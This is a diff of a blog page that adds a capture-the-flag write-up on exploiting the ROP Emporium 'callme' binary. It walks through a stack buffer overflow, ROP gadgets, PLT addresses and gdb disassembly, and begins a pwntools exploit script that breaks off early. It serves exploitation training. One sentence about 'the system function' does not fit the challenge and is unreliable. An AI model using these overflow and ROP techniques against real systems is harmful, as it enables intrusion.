@@ -1,20 +1,41 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=''><title>Return-Oriented Programming - Callme</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Introduction Challenge Description
+The goal of this challenge is to understand how more than one argument is passed in x64 function. The challenge can be downloaded from the authors website ropemporium
+ Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.
+ The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge.'><title>Return-Oriented Programming - Callme</title>
 
 <link rel='canonical' href='https://thuri10.github.io/p/return-oriented-programming-callme/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Return-Oriented Programming - Callme'>
-<meta property='og:description' content=''>
+<link rel="stylesheet" href="/scss/style.min.775dbd4fd34fda61c5273b4bc3415f7c9666414fb6c40aab164a7ded4397da98.css"><meta property='og:title' content='Return-Oriented Programming - Callme'>
+<meta property='og:description' content='Introduction Challenge Description
+The goal of this challenge is to understand how more than one argument is passed in x64 function. The challenge can be downloaded from the authors website ropemporium
+ Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.
+ The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge.'>
 <meta property='og:url' content='https://thuri10.github.io/p/return-oriented-programming-callme/'>
 <meta property='og:site_name' content='Solar Bits'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ropemprium' /><meta property='article:tag' content='rop' /><meta property='article:tag' content='pwn' /><meta property='article:published_time' content='2021-12-20T20:49:43&#43;03:00'/><meta property='article:modified_time' content='2021-12-20T20:49:43&#43;03:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ropemporium' /><meta property='article:tag' content='rop' /><meta property='article:tag' content='pwn' /><meta property='article:published_time' content='2021-12-20T20:49:43&#43;03:00'/><meta property='article:modified_time' content='2021-12-20T20:49:43&#43;03:00'/><meta property='og:image' content='https://thuri10.github.io/post/ropemporium/callme.jpg' />
 <meta name="twitter:title" content="Return-Oriented Programming - Callme">
-<meta name="twitter:description" content="">
+<meta name="twitter:description" content="Introduction Challenge Description
+The goal of this challenge is to understand how more than one argument is passed in x64 function. The challenge can be downloaded from the authors website ropemporium
+ Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.
+ The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://thuri10.github.io/post/ropemporium/callme.jpg' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-DC4ZP2YRDZ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-DC4ZP2YRDZ', { 'anonymize_ip': false });
+}
+</script>
+
     </head>
     <body class="
-    article-page 
+    article-page has-toc
 ">
     <script>
         (function() {
@@ -40,195 +61,34 @@
 </script>
 <div class="container main-container flex 
     
-        on-phone--column extended
+        extended
     
 ">
     
-        <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu82c25fa98cd4e9a8103220017be4b8cb_139991_300x0_resize_box_3.png" width="300"
-                            height="276" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🥷</span>
-                
-            </figure>
-            
-        
-        
-        <h1 class="site-name"><a href="/">Solar Bits</a></h1>
-        <h2 class="site-description">Bit Flipping.</h2><ol class="social-menu">
-                
-                    <li>
-                        <a 
-                            href='https://github.com/thuri10'
-                            target="_blank"
-                            title="GitHub"
-                        >
-                            
-                            
-                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
-</svg>
-
-
-
-                            
-                        </a>
-                    </li>
-                
-                    <li>
-                        <a 
-                            href='https://twitter.com/0xhexski'
-                            target="_blank"
-                            title="Twitter"
-                        >
-                            
-                            
-                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
-</svg>
-
-
-
-                            
-                        </a>
-                    </li>
-                
-            </ol></header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/' target="_blank">
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+  <polyline points="15 6 9 12 15 18" />
 </svg>
 
 
 
-                
-                <span>Home</span>
+                <span>Back</span>
             </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/about/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        
-            <li id="dark-mode-toggle">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <span>Dark Mode</span>
-            </li>
-        
-    </ol>
-</aside>
-
+        </div>
     
 <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/return-oriented-programming-callme/">
+                
+                    <img src="/post/ropemporium/callme.jpg" loading="lazy" alt="Featured image of post Return-Oriented Programming - Callme" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
@@ -267,7 +127,7 @@
 
 
                 <time class="article-time--reading">
-                    0 minute read
+                    5 minute read
                 </time>
             </div>
         
@@ -277,7 +137,206 @@
 </header>
 
     <section class="article-content">
-    
+    <h2 id="introduction">Introduction</h2>
+<p>Challenge Description</p>
+<p>The goal of this challenge is to understand how  more than one argument is  passed in x64 function. The challenge can be downloaded from the authors website <a class="link" href="https://ropemporium.com"  target="_blank" rel="noopener"
+    >ropemporium</a></p>
+<blockquote>
+<p>Reliably make consecutive calls to imported functions.
+Use some new techniques and learn about the Procedure Linkage Table.</p>
+</blockquote>
+<p>The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge.</p>
+<blockquote>
+<p><strong>You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</strong></p>
+</blockquote>
+<p>First we check the binary protections enabled on the callme binary, only <strong>NX</strong>( Not Executable) is enabled on the binary as shown below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vx@archie:callme$ checksec --file callme
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#5bc4bf">(</span>0x400000<span style="color:#5bc4bf">)</span>
+    RUNPATH:  b<span style="color:#48b685">&#39;.&#39;</span>
+</code></pre></div><p>Open the <strong>callme</strong> binary in radare2 to look for exploitable vulnerability and examine the behavior of the binary. radare2 is a powerful disassembler/debugging tool in Linux, used for examining the  behavior of programs.</p>
+<p><figure 
+	>
+	<a href="/post/ropemporium/callme_bug.png" >
+		<img src="/post/ropemporium/callme_bug.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>From the above image we use <strong>pdf</strong> command in to do disassembly at a given function. From the image above, the function <strong>pwnme</strong> looks similar to the previous challenges ret2win and split.</p>
+<p>From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values that is present in the memory area specified. The memory area we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the address of base pointer in the stack.
+<figure 
+	>
+	<a href="/post/ropemporium/stack.png" >
+		<img src="/post/ropemporium/stack.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>Therefore the next function is read function, which reads for user input and stores in the specified buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#06b6ef">read</span>(<span style="color:#fec418">int</span> fd, <span style="color:#fec418">void</span> <span style="color:#5bc4bf">*</span>buf, size_t count);
+</code></pre></div><p>From the above disassembled code, we are reading 0x200 bytes from the standard input file descriptor and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.</p>
+<p>For exploitation stack overflow, we need to fill our buffer, overwrite the rbp register and control the return address.</p>
+<p>For building our ropchain, we need to understand the calling conventions of AMD64 ABI. The calling convention passes the arguments to the registers in the following order. RDI, RSI, RDX, RCX, R8 and R9.</p>
+<p>Because the system function receives one argument, we need to look for one gadgets that we control the rdi, rsi and rdx registers.</p>
+<p><strong>What are gadgets?</strong></p>
+<p>Gadgets are sequence of instructions the end with ret. because we want to load three argument into registers, we will look for a pop rdi, pop rsi, pop rdx; ret instruction in order to pass an arguments to the callme_one, callme_two, callme_three functions.</p>
+<p>The example of the <strong>pop rdi,pop rsi,pop rdx, ret</strong> gadget is shown in image below.</p>
+<p><figure 
+	>
+	<a href="/post/ropemporium/poprdi_callme.png" >
+		<img src="/post/ropemporium/poprdi_callme.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>Next step is to determine the address of callme_one, callme_two, callme_three functions. For determining the functions address we use gdb to get the memory addresses.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) <span style="color:#ef6155">info</span> <span style="color:#ef6155">functions</span>
+<span style="color:#06b6ef">All</span> <span style="color:#ef6155">defined</span> <span style="color:#ef6155">functions</span>:
+
+<span style="color:#06b6ef">Non</span><span style="color:#5bc4bf">-</span><span style="color:#ef6155">debugging</span> <span style="color:#ef6155">symbols</span>:
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006a8</span>  <span style="color:#ef6155">_init</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006d0</span>  <span style="color:#ef6155">puts@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006e0</span>  <span style="color:#ef6155">printf@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004006f0</span>  <span style="color:#ef6155">callme_three@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400700</span>  <span style="color:#ef6155">memset@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400710</span>  <span style="color:#ef6155">read@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400720</span>  <span style="color:#ef6155">callme_one@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400730</span>  <span style="color:#ef6155">setvbuf@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400740</span>  <span style="color:#ef6155">callme_two@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400750</span>  <span style="color:#ef6155">exit@plt</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400760</span>  <span style="color:#ef6155">_start</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400790</span>  <span style="color:#ef6155">_dl_relocate_static_pie</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004007a0</span>  <span style="color:#ef6155">deregister_tm_clones</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004007d0</span>  <span style="color:#ef6155">register_tm_clones</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400810</span>  <span style="color:#ef6155">__do_global_dtors_aux</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400840</span>  <span style="color:#ef6155">frame_dummy</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400847</span>  <span style="color:#ef6155">main</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400898</span>  <span style="color:#ef6155">pwnme</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004008f2</span>  <span style="color:#ef6155">usefulFunction</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040093c</span>  <span style="color:#ef6155">usefulGadgets</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400940</span>  <span style="color:#ef6155">__libc_csu_init</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004009b0</span>  <span style="color:#ef6155">__libc_csu_fini</span>
+<span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000004009b4</span>  <span style="color:#ef6155">_fini</span>
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) 
+</code></pre></div><p>Reverse engineer one of the target function in order to understand how the arguments are passed to the function.Because the <strong>callme</strong> binary does PLT relocations of the functions of callme* , we need to disassemble the target shared library <strong>libcallme.so</strong> as shown below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">vx@archie:<span style="color:#06b6ef">callme$</span> <span style="color:#ef6155">gdb</span> <span style="color:#5bc4bf">-</span><span style="color:#ef6155">q</span> <span style="color:#ef6155">libcallme.so</span>
+<span style="color:#06b6ef">Reading</span> <span style="color:#ef6155">symbols</span> <span style="color:#ef6155">from</span> <span style="color:#ef6155">libcallme.so...</span>
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">No</span> <span style="color:#ef6155">debugging</span> <span style="color:#ef6155">symbols</span> <span style="color:#ef6155">found</span> <span style="color:#ef6155">in</span> <span style="color:#ef6155">libcallme.so</span>)
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) di<span style="color:#ef6155">sas</span> <span style="color:#ef6155">callme_one</span>
+<span style="color:#06b6ef">Dump</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">code</span> <span style="color:#ef6155">for</span> <span style="color:#ef6155">function</span> <span style="color:#ef6155">callme_one</span>:
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000081a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">push</span>   rbp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000081b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rbp,rsp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000081e</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">4</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">sub</span>    rsp,<span style="color:#f99b15">0x30</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000822</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">8</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x18</span>],rdi
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000826</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">12</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x20</span>],rsi
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000082a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">16</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x28</span>],rdx
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000082e</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">20</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">movabs</span> rax,<span style="color:#f99b15">0xdeadbeefdeadbeef</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000838</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">30</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">cmp</span>    <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x18</span>],rax
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000083c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">34</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">jne</span>    <span style="color:#f99b15">0x912</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">callme_one</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">248</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000842</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">40</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">movabs</span> rax,<span style="color:#f99b15">0xcafebabecafebabe</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000084c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">50</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">cmp</span>    <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x20</span>],rax
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000850</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">54</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">jne</span>    <span style="color:#f99b15">0x912</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">callme_one</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">248</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000856</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">60</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">movabs</span> rax,<span style="color:#f99b15">0xd00df00dd00df00d</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000860</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">70</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">cmp</span>    <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x28</span>],rax
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000864</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">74</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">jne</span>    <span style="color:#f99b15">0x912</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">callme_one</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">248</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000086a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">80</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    <span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x8</span>],<span style="color:#f99b15">0x0</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000872</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">88</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rsi,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x32f</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0xba8</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000879</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">95</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rdi,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x32a</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0xbaa</span>
+   <span style="color:#ef6155">------</span>
+   <span style="color:#ef6155">------</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000912</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">248</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rdi,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x301</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0xc1a</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000919</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">255</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x6c0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000091e</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">260</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x1</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000923</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">265</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x720</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">exit@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000928</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">270</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">nop</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000929</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">271</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">leave</span>  
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000092a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">272</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">ret</span>    
+<span style="color:#06b6ef">End</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">dump.</span>
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) 
+</code></pre></div><p>From the disassembly code above, we can we are comparing our arguments in which we are passing to callme_one function. if the string values are not equal to values passed to the rdi, rsi and rdx registers the program exits, otherwise we get a flag.</p>
+<p>From previous knowledge of solving other challenges, we need to overwrite the return address with the pop rdi, pop rsi, pop rdx, ret gadget and call each function in a sequential manner.</p>
+<h2 id="exploit">Exploit</h2>
+<p>Fully working rop chain code is as shown below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#5bc4bf">import</span> <span style="color:#fec418">pwn</span>
+
+pwn<span style="color:#5bc4bf">.</span>context<span style="color:#5bc4bf">.</span>encoding <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;latin-1&#34;</span>
+pwn<span style="color:#5bc4bf">.</span>warnings<span style="color:#5bc4bf">.</span>simplefilter(<span style="color:#48b685">&#34;ignore&#34;</span>)
+pwn<span style="color:#5bc4bf">.</span>context<span style="color:#5bc4bf">.</span>arch <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;amd64&#34;</span>
+
+io <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>process(<span style="color:#48b685">&#39;./callme&#39;</span>)
+
